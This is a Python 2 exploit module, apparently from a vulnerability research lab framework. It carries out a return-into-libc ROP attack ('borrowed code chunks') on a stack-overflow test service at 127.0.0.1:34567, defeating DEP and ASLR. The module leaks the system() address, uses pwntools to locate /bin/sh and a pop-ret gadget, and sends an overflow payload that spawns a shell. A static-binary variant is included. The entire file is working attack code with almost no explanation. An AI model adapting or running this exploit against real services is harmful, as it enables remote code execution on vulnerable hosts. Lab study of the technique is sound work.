#! /usr/bin/python
#coding:utf-8
import os
import socket
import sys
sys.path.append(os.path.abspath("../.."))
from modules import exploit
from pwnlib.elf import ELF
from pwnlib.util.packing import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'borrowed_code_chunks'
        self.payload_info = 'DEP ALSR ON'
        self.info =''' Exploit Name : borrowed code chunks
Exploit abstract : This technique looks for functions that contain instruction sequences that pop values from the stack
                   into registers. Careful selection of these code sequences allows an attacker to put suitable values
                   into the proper registers to perform a function call under the new calling convention. The rest of
                   the attack proceeds as a return-into-library attack.
Author : guoyingjie
Support change payload : false'''
        self.property = {'ret':0x0000000000021102, #gadget address in libc
                         'offset':40, #offset
                         'sysaddress':0x0} # system function address, initialize 0
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'False',
                      'static' : 'False',
                      'aslr' : 'on'
                      }
        self.vulnerability= 'stack_overflow'
       

    def run(self):
      if self.options['static'] == 'False':

        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        #get new sysaddress here
        s.send("a")        #any string
        recv_data = s.recv(16)
        self.property['sysaddress'] = int(recv_data,16)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

        #get /bin/sh offset
        print "sysaddress = " + hex(self.property['sysaddress'])
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)

        #get ret offset
        pop_ret_offset = self.property['ret'] - libc.symbols['system']
        print "pop_ret_offset = " + hex(pop_ret_offset)

        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset

        #get ret address
        pop_ret_addr = self.property['sysaddress'] + pop_ret_offset

        payload = "a"*self.property['offset'] + p64(pop_ret_addr) + p64(binsh_addr) + p64(self.property['sysaddress'])
        print "\n##########sending payload##########\n"
        s.send(payload)
        s.close()
        #p.interactive()
      else:
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        self.property = {'ret':0x0000000000401696, #gadget address in exe
                         'offset':24, #offset
                         'sysaddress':0x0} # system function address, initialize 0
      
        self.vulnerability= 'vulnerabilities/stack_overflow/ggteststatic'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

     
        
        libc = ELF('../../vulnerabilities/stack_overflow/ggteststatic')

        self.property['sysaddress'] = libc.symbols['system']
        print "sysaddress = " + hex(self.property['sysaddress'])
     


        #get /bin/sh address
        binsh_addr = next(libc.search('/bin/sh'))

        #get ret address
        pop_ret_addr = self.property['ret']

        payload = "a"*self.property['offset'] + p64(pop_ret_addr) + p64(binsh_addr) + p64(self.property['sysaddress'])
        print "\n##########sending payload##########\n"
        s.send(payload)
        s.close()
       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.frame_check():
        print 'Running:\n'
        exp.run()




